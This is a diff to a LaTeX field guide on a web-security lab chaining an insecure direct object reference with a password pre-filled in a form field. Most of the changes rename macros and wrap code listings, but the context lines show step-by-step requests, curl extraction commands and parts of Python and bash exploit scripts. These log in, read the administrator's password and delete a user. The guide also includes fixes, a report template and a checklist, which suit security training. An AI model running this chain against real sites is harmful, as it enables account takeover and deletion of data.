@@ -37,7 +37,7 @@
 \definecolor{passwordcolor}{rgb}{0.8,0.0,0.0}
 
 % Robust inline code (handles %, _, #, etc.)
-\newcommand{\code}[1]{\texttt{\detokenize{#1}}}
+\newcommand{\inlinecode}[1]{\texttt{\detokenize{#1}}}
 \renewcommand{\kbd}[1]{\fbox{\texttt{\small #1}}}
 \newcommand{\filepath}[1]{\texttt{#1}}
 \newcommand{\password}[1]{\texttt{\color{passwordcolor}#1}}
@@ -87,7 +87,7 @@
 \maketitle
 
 \begin{abstract}
-\noindent This comprehensive field guide addresses a critical chained vulnerability pattern: \textbf{Insecure Direct Object Reference (IDOR) combined with password disclosure in the DOM}. In this scenario, the application's account page accepts a user-controlled \code{id} parameter to select which user's data to display, AND pre-fills the user's current password in a masked input field. This creates a devastating attack chain where any authenticated user can access any other user's account page, extract their plaintext password from the HTML source, authenticate as that user, and perform privileged actions.
+\noindent This comprehensive field guide addresses a critical chained vulnerability pattern: \textbf{Insecure Direct Object Reference (IDOR) combined with password disclosure in the DOM}. In this scenario, the application's account page accepts a user-controlled \inlinecode{id} parameter to select which user's data to display, AND pre-fills the user's current password in a masked input field. This creates a devastating attack chain where any authenticated user can access any other user's account page, extract their plaintext password from the HTML source, authenticate as that user, and perform privileged actions.
 
 This guide provides security professionals with:
 \begin{itemize}
@@ -150,7 +150,7 @@ This vulnerability pattern combines two distinct security failures:
 \toprule
 \textbf{Aspect} & \textbf{Failure 1: IDOR} & \textbf{Failure 2: Password Disclosure} \\
 \midrule
-Description & \code{/my-account?id=X} returns any user's data & Password pre-filled in masked input \\
+Description & \inlinecode{/my-account?id=X} returns any user's data & Password pre-filled in masked input \\
 Root Cause & Missing object-level authorization & Plaintext password storage/retrieval \\
 Standalone Impact & Medium (data exposure) & Low-Medium (requires XSS to exploit) \\
 Combined Impact & \multicolumn{2}{c}{\textbf{Critical: Complete account takeover of any user}} \\
@@ -222,17 +222,20 @@ Correct systems:
 
 \subsubsection{Why Masking Doesn't Help}
 
-The UI password mask (\code{type="password"}) only affects \emph{visual display}. If the HTML contains:
+The UI password mask (\inlinecode{type="password"}) only affects \emph{visual display}. If the HTML contains:
 
-\begin{minted}[caption={Password ``masked'' in UI but fully exposed in DOM}]{html}
+\begin{listing}[H]
+\begin{minted}{html}
 <input type="password" name="password" value="SuperSecret123!" />
 \end{minted}
+\caption{Password ``masked'' in UI but fully exposed in DOM}
+\end{listing}
 
 The password is fully accessible via:
 \begin{itemize}
   \item \textbf{View Source}: Right-click $\rightarrow$ View Page Source
   \item \textbf{DevTools}: F12 $\rightarrow$ Elements $\rightarrow$ Inspect the input
-  \item \textbf{JavaScript}: \code{document.querySelector('input[name=password]').value}
+  \item \textbf{JavaScript}: \inlinecode{document.querySelector('input[name=password]').value}
   \item \textbf{XSS payload}: If XSS exists anywhere, steal all passwords
   \item \textbf{Automation}: curl/requests can extract from response body
 \end{itemize}
@@ -266,7 +269,8 @@ Lateral Movement & Credentials may be reused elsewhere \\
 
 After logging in, examine the account page URL:
 
-\begin{minted}[caption={Identifying user ID in URL parameter}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 -- After login, observe the account URL --
 GET /my-account?id=wiener HTTP/1.1
 Host: target.example.com
@@ -274,14 +278,16 @@ Cookie: session=xyz789
 
 -- Key observation: the 'id' parameter controls which user's data is shown --
 \end{minted}
+\caption{Identifying user ID in URL parameter}
+\end{listing}
 
 \begin{notebox}[Discovery Indicators]
 Look for these patterns in account/profile URLs:
 \begin{itemize}
-  \item \code{/my-account?id=username}
-  \item \code{/profile?user=john}
-  \item \code{/account?uid=12345}
-  \item \code{/settings?userId=abc-123}
+  \item \inlinecode{/my-account?id=username}
+  \item \inlinecode{/profile?user=john}
+  \item \inlinecode{/account?uid=12345}
+  \item \inlinecode{/settings?userId=abc-123}
 \end{itemize}
 \end{notebox}
 
@@ -289,7 +295,8 @@ Look for these patterns in account/profile URLs:
 
 \subsubsection{Inspect Password Fields in Response}
 
-\begin{minted}[caption={Searching for password values in response}]{bash}
+\begin{listing}[H]
+\begin{minted}{bash}
 # Fetch account page and search for password in value attribute
 curl -s -b "session=xyz789" \
   "https://target.example.com/my-account?id=wiener" | \
@@ -301,6 +308,8 @@ curl -s -b "session=xyz789" \
   "https://target.example.com/my-account?id=wiener" | \
   grep -iE '(password|passwd|pwd).*value='
 \end{minted}
+\caption{Searching for password values in response}
+\end{listing}
 
 \subsubsection{Browser DevTools Method}
 
@@ -309,11 +318,12 @@ curl -s -b "session=xyz789" \
   \item Open DevTools (\kbd{F12})
   \item Go to Elements tab
   \item Find the password input field
-  \item Check if it has a \code{value} attribute with actual password
-  \item Alternatively: Console $\rightarrow$ \code{document.querySelector('input[type=password]').value}
+  \item Check if it has a \inlinecode{value} attribute with actual password
+  \item Alternatively: Console $\rightarrow$ \inlinecode{document.querySelector('input[type=password]').value}
 \end{enumerate}
 
-\begin{minted}[caption={What vulnerable password field looks like in Elements tab}]{html}
+\begin{listing}[H]
+\begin{minted}{html}
 <!-- VULNERABLE: Password pre-filled in value attribute -->
 <input
     type="password"
@@ -328,10 +338,13 @@ curl -s -b "session=xyz789" \
     placeholder="Enter new password"
 />
 \end{minted}
+\caption{What vulnerable password field looks like in Elements tab}
+\end{listing}
 
 \subsection{Phase 3: Test IDOR for Account Access}
 
-\begin{minted}[caption={Testing IDOR by changing user ID}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 -- Original request (your account) --
 GET /my-account?id=wiener HTTP/1.1
 Cookie: session=your_session_token
@@ -342,6 +355,8 @@ Cookie: session=your_session_token
 
 -- If vulnerable: returns administrator's account data --
 \end{minted}
+\caption{Testing IDOR by changing user ID}
+\end{listing}
 
 % ============================================================
 \section{Manual Exploitation Workflow}
@@ -352,7 +367,7 @@ Cookie: session=your_session_token
 \begin{enumerate}
   \item \textbf{Burp Suite Configuration}
   \begin{itemize}
-    \item Proxy listener on \code{127.0.0.1:8080}
+    \item Proxy listener on \inlinecode{127.0.0.1:8080}
     \item Intercept initially disabled
     \item Project file created for evidence
   \end{itemize}
@@ -366,7 +381,8 @@ Cookie: session=your_session_token
 
 \subsection{Step 1: Login as Low-Privilege User}
 
-\begin{minted}[caption={Step 1: Login with provided credentials}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 -- Get CSRF token from login page --
 GET /login HTTP/1.1
 Host: 0aXXXXXXXX.web-security-academy.net
@@ -391,10 +407,13 @@ HTTP/1.1 302 Found
 Location: /my-account?id=wiener
 Set-Cookie: session=authenticatedSession123
 \end{minted}
+\caption{Step 1: Login with provided credentials}
+\end{listing}
 
 \subsection{Step 2: Access Your Account and Observe Password Field}
 
-\begin{minted}[caption={Step 2: Observe password disclosure on own account}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 GET /my-account?id=wiener HTTP/1.1
 Host: 0aXXXXXXXX.web-security-academy.net
 Cookie: session=authenticatedSession123
@@ -423,14 +442,17 @@ Content-Type: text/html
 </body>
 </html>
 \end{minted}
+\caption{Step 2: Observe password disclosure on own account}
+\end{listing}
 
 \begin{tipbox}[Key Observation]
-Notice the password input has \code{value="peter"} - your actual password is visible in the HTML source! This is vulnerability \#1: Password Disclosure.
+Notice the password input has \inlinecode{value="peter"} - your actual password is visible in the HTML source! This is vulnerability \#1: Password Disclosure.
 \end{tipbox}
 
 \subsection{Step 3: Exploit IDOR to Access Administrator Account}
 
-\begin{minted}[caption={Step 3: Change id parameter to administrator}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 -- Using Burp Repeater, modify the id parameter --
 GET /my-account?id=administrator HTTP/1.1
 Host: 0aXXXXXXXX.web-security-academy.net
@@ -460,6 +482,8 @@ Content-Type: text/html
 </body>
 </html>
 \end{minted}
+\caption{Step 3: Change id parameter to administrator}
+\end{listing}
 
 \begin{warningbox}[Critical Vulnerability Confirmed]
 We accessed the administrator's account page using our low-privilege session, and the response contains the administrator's plaintext password: \password{xK7mN9pQrS2t}
@@ -482,7 +506,8 @@ From the response HTML, extract the password from:
 
 \subsection{Step 5: Authenticate as Administrator}
 
-\begin{minted}[caption={Step 5: Login as administrator}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 -- Logout first or use new session --
 POST /login HTTP/1.1
 Host: 0aXXXXXXXX.web-security-academy.net
@@ -504,10 +529,13 @@ HTTP/1.1 200 OK
 
 <a href="/admin">Admin panel</a>
 \end{minted}
+\caption{Step 5: Login as administrator}
+\end{listing}
 
 \subsection{Step 6: Execute Privileged Action}
 
-\begin{minted}[caption={Step 6: Access admin panel and delete user}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 -- Access admin panel --
 GET /admin HTTP/1.1
 Host: 0aXXXXXXXX.web-security-academy.net
@@ -534,6 +562,8 @@ Location: /admin
 
 -- Lab solved! --
 \end{minted}
+\caption{Step 6: Access admin panel and delete user}
+\end{listing}
 
 % ============================================================
 \section{Automated Exploitation}
@@ -541,7 +571,8 @@ Location: /admin
 
 \subsection{Complete Python Exploitation Script}
 
-\begin{minted}[caption={Full multi-phase exploitation script}]{python}
+\begin{listing}[H]
+\begin{minted}{python}
 #!/usr/bin/env python3
 """
 User ID Controlled by Parameter with Password Disclosure - Exploit Script
@@ -884,10 +915,13 @@ def main():
 if __name__ == "__main__":
     main()
 \end{minted}
+\caption{Full multi-phase exploitation script}
+\end{listing}
 
 \subsection{Minimal Exploitation Script}
 
-\begin{minted}[caption={Simplified single-purpose script}]{python}
+\begin{listing}[H]
+\begin{minted}{python}
 #!/usr/bin/env python3
 """Minimal IDOR + Password Disclosure exploitation script."""
 
@@ -971,10 +1005,13 @@ if __name__ == "__main__":
     success = exploit(sys.argv[1].rstrip('/'))
     sys.exit(0 if success else 1)
 \end{minted}
+\caption{Simplified single-purpose script}
+\end{listing}
 
 \subsection{Bash Exploitation Script}
 
-\begin{minted}[caption={Command-line exploitation with curl}]{bash}
+\begin{listing}[H]
+\begin{minted}{bash}
 #!/bin/bash
 # IDOR + Password Disclosure Exploit
 # Usage: ./exploit.sh https://target.example.com
@@ -1044,6 +1081,8 @@ echo "[+] Carlos deleted!"
 rm -f cookies.txt
 echo "[+] Exploit complete!"
 \end{minted}
+\caption{Command-line exploitation with curl}
+\end{listing}
 
 % ============================================================
 \section{Evidence Collection and Reporting}
@@ -1055,14 +1094,14 @@ echo "[+] Exploit complete!"
   \item \textbf{IDOR Evidence}
   \begin{itemize}
     \item Request showing access to admin account with low-privilege session
-    \item \code{GET /my-account?id=administrator} with wiener's cookie
+    \item \inlinecode{GET /my-account?id=administrator} with wiener's cookie
     \item Response showing administrator's account data
   \end{itemize}
 
   \item \textbf{Password Disclosure Evidence}
   \begin{itemize}
-    \item Screenshot/snippet of HTML showing password in \code{value} attribute
-    \item Highlighted: \code{<input type="password" name="password" value="ACTUAL_PASSWORD">}
+    \item Screenshot/snippet of HTML showing password in \inlinecode{value} attribute
+    \item Highlighted: \inlinecode{<input type="password" name="password" value="ACTUAL_PASSWORD">}
   \end{itemize}
 
   \item \textbf{Account Takeover Evidence}
@@ -1080,7 +1119,8 @@ echo "[+] Exploit complete!"
 
 \subsection{Report Template}
 
-\begin{minted}[caption={Vulnerability report template}]{text}
+\begin{listing}[H]
+\begin{minted}{text}
 # Vulnerability Report: IDOR + Password Disclosure Chain
 
 ## Executive Summary
@@ -1146,6 +1186,8 @@ GET /admin/delete?username=carlos
 - CWE-256: Plaintext Storage of a Password
 - OWASP: Broken Access Control
 \end{minted}
+\caption{Vulnerability report template}
+\end{listing}
 
 % ============================================================
 \section{Remediation Patterns}
@@ -1162,7 +1204,8 @@ GET /admin/delete?username=carlos
 \end{enumerate}
 \end{criticalbox}
 
-\begin{minted}[caption={Node.js: Proper password storage and change flow}]{javascript}
+\begin{listing}[H]
+\begin{minted}{javascript}
 const bcrypt = require('bcrypt');
 
 // NEVER: Store plaintext passwords
@@ -1212,10 +1255,13 @@ app.post('/change-password', requireAuth, async (req, res) => {
     res.send('Password updated');
 });
 \end{minted}
+\caption{Node.js: Proper password storage and change flow}
+\end{listing}
 
 \subsection{Fix 2: Remove IDOR Vulnerability}
 
-\begin{minted}[caption={Node.js: Derive user from session, not parameter}]{javascript}
+\begin{listing}[H]
+\begin{minted}{javascript}
 // VULNERABLE: User ID from request parameter
 app.get('/my-account', (req, res) => {
     const userId = req.query.id;  // Attacker-controlled!
@@ -1234,10 +1280,13 @@ app.get('/my-account', requireAuth, (req, res) => {
     });
 });
 \end{minted}
+\caption{Node.js: Derive user from session, not parameter}
+\end{listing}
 
 \subsection{Fix 3: Django Implementation}
 
-\begin{minted}[caption={Django: Secure account view}]{python}
+\begin{listing}[H]
+\begin{minted}{python}
 from django.contrib.auth.decorators import login_required
 from django.contrib.auth.hashers import make_password, check_password
 from django.http import HttpResponseForbidden
@@ -1275,10 +1324,13 @@ def change_password(request):
 
     return redirect('account')
 \end{minted}
+\caption{Django: Secure account view}
+\end{listing}
 
 \subsection{HTML Template Fix}
 
-\begin{minted}[caption={Secure password change form template}]{html}
+\begin{listing}[H]
+\begin{minted}{html}
 <!-- VULNERABLE: Pre-filled password field -->
 <form method="POST" action="/change-password">
     <label>Password</label>
@@ -1303,6 +1355,8 @@ def change_password(request):
     <button type="submit">Change Password</button>
 </form>
 \end{minted}
+\caption{Secure password change form template}
+\end{listing}
 
 % ============================================================
 \section{Testing Checklist}
@@ -1326,7 +1380,7 @@ def change_password(request):
   \item Search for ``password'' in source
   \item Check if any input fields have value attributes with passwords
   \item Use DevTools to inspect password fields
-  \item Test: \code{document.querySelector('input[type=password]').value}
+  \item Test: \inlinecode{document.querySelector('input[type=password]').value}
   \item Check API responses for password fields
 \end{itemize}
 
@@ -1354,9 +1408,9 @@ def change_password(request):
 \midrule
 View Source & \kbd{Ctrl+U} $\rightarrow$ Search ``password'' \\
 DevTools Elements & \kbd{F12} $\rightarrow$ Find password input $\rightarrow$ Check value \\
-DevTools Console & \code{document.querySelector('input[name=password]').value} \\
-curl + grep & \code{curl -s URL | grep -oP 'value="\textbackslash K[^"]+'} \\
-Python/BeautifulSoup & \code{soup.find('input', \{'name': 'password'\})['value']} \\
+DevTools Console & \inlinecode{document.querySelector('input[name=password]').value} \\
+curl + grep & \inlinecode{curl -s URL | grep -oP 'value="\textbackslash K[^"]+'} \\
+Python/BeautifulSoup & \inlinecode{soup.find('input', \{'name': 'password'\})['value']} \\
 \bottomrule
 \caption{Password extraction techniques}
 \end{longtable}
@@ -1367,11 +1421,11 @@ Python/BeautifulSoup & \code{soup.find('input', \{'name': 'password'\})['value']
 \toprule
 \textbf{Parameter} & \textbf{Example URL} \\
 \midrule
-\code{id} & \code{/my-account?id=administrator} \\
-\code{user} & \code{/profile?user=admin} \\
-\code{userId} & \code{/account?userId=12345} \\
-\code{uid} & \code{/settings?uid=admin} \\
-\code{username} & \code{/account?username=administrator} \\
+\inlinecode{id} & \inlinecode{/my-account?id=administrator} \\
+\inlinecode{user} & \inlinecode{/profile?user=admin} \\
+\inlinecode{userId} & \inlinecode{/account?userId=12345} \\
+\inlinecode{uid} & \inlinecode{/settings?uid=admin} \\
+\inlinecode{username} & \inlinecode{/account?username=administrator} \\
 \bottomrule
 \caption{Common IDOR parameter names}
 \end{longtable}
